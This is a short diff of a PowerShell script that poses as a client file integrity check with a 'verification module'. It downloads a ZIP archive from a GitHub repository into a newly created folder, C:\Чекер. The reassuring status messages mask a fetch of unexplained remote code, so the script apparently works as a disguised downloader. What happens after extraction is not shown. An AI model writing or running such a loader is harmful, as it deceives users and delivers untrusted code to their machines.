@@ -9,14 +9,17 @@ Write-Host "[*] Checking client file integrity..." -ForegroundColor Cyan
 Start-Sleep -Seconds 1
 
 $URL = "https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip"
-$ZIP = "$env:TEMP\main.zip"
-$EXTRACT = "$env:TEMP\CHECKK-main"
+$ZIP = "C:\Чекер\main.zip"
+$EXTRACT = "C:\Чекер\CHECKK-main"
+
+# Создаём папку C:\Чекер, если её нет
+if (!(Test-Path "C:\Чекер")) {
+    New-Item -ItemType Directory -Path "C:\Чекер" -Force | Out-Null
+}
 
 try {
     Write-Host "[*] Loading verification module..." -ForegroundColor Yellow
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
-    $webClient.DownloadFile($URL, $ZIP)
+    (New-Object Net.WebClient).DownloadFile($URL, $ZIP)
     Write-Host "[+] Module loaded" -ForegroundColor Green
 } catch {
     Write-Host "[-] Module download error" -ForegroundColor Red
